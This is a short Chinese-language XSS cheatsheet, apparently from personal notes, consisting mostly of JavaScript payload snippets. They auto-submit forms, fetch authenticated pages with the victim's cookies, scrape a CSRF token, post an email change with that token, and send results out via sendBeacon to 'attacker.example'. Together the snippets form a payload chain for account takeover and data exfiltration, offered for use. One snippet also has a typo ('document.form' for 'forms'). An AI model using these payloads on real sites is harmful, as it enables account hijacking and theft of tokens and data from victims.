---
title: XSS
date: 2026-10-24
updated: 2026-10-24
tags:
  - XSS
  - Cheatsheet
  - javascript
description: Cheatsheet
---
## 自动提交表单

```html
<form action="https://example.com/submit" method="POST">
  <input type="hidden" name="t" value="hello">
  <button type="submit">提交</button>
</form>
<script>
document.form[0].submit();
</script>
```

或者根据 `id` 选择器去提交指定表单：

```html
<form id="f" action="https://example.com/submit" method="POST">
  <input type="hidden" name="t" value="hello">
</form>
<script>
document.getElementById('f').submit();
</script>
```

## 发请求并拿到正文

```javascript
const html = await (await fetch("/settings", { credentials: "include" })).text();
```

`credentials: "include"` 保证带上当前站的 Cookie（同源时其实默认也会带，写上只是免得自己忘）。

如果是 JSON 接口，则把 `.text()` 换成 `.json()`：

```javascript
const data = await (await fetch("/api/me", { credentials: "include" })).json();
const token = data.csrfToken;
```

如果需要发 POST 请求：

```js
const data = await(
    await fetch('/login',{
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: "include",
            body: JSON.stringify({
                username: "admin",
                password: "test"
            })
        }
    )
).json()

console.log(data)
```

如果交的是表单数据：

```javascript
await fetch("/settings/email", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ csrf: token, email: "a@b.c" })
});
```

`URLSearchParams` 会帮你做 `key1=value1&key2=value2` 和编码。

## 从 HTML 里抠一个值

先解析再查询：

```javascript
const doc = new DOMParser().parseFromString(html, "text/html");
const token = doc.querySelector('input[name="csrf"]').value;
```

`input[name="csrf"]` 用于定位元素，通过 `标签[属性=属性值]`。

`input[name="csrf"].value` 表示取定位到的元素中的 `value` 属性的值。

## 把结果送出源

用 `sendBeacon`，页面关掉也能发出去（用的 POST 方法）：

```javascript
navigator.sendBeacon("https://attacker.example/log", token);
```